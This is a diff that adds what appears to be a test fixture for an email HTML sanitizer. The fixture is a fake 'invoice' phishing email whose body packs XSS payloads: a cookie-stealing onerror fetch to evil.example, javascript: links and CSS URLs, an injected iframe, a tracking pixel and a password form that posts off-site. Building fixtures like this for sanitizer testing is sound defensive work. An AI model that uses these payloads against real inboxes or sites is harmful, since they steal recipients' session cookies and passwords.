@@ -1,0 +1,17 @@
+From: "Prize Desk" <promo@example.com>
+To: ivy-a@grove.test
+Subject: Your invoice is attached (open immediately)
+Date: Mon, 03 Nov 2025 09:14:00 +0000
+Message-ID: <corpus-xss-1@example.com>
+MIME-Version: 1.0
+Content-Type: text/html; charset=utf-8
+
+<html><body onload="steal()">
+<h1>Invoice</h1>
+<p>Dear customer, <a href="javascript:alert(1)">click here</a> to view your invoice.</p>
+<img src="x" onerror="fetch('https://evil.example/steal?c='+document.cookie)">
+<img src="https://tracking.example/pixel.gif?u=ivy-a" width="1" height="1">
+<script>document.write('<iframe src="https://evil.example/frame"></iframe>')</script>
+<style>body{background:url(javascript:alert(2))}</style>
+<form action="https://evil.example/post"><input name="password"><button>Sign in</button></form>
+</body></html>
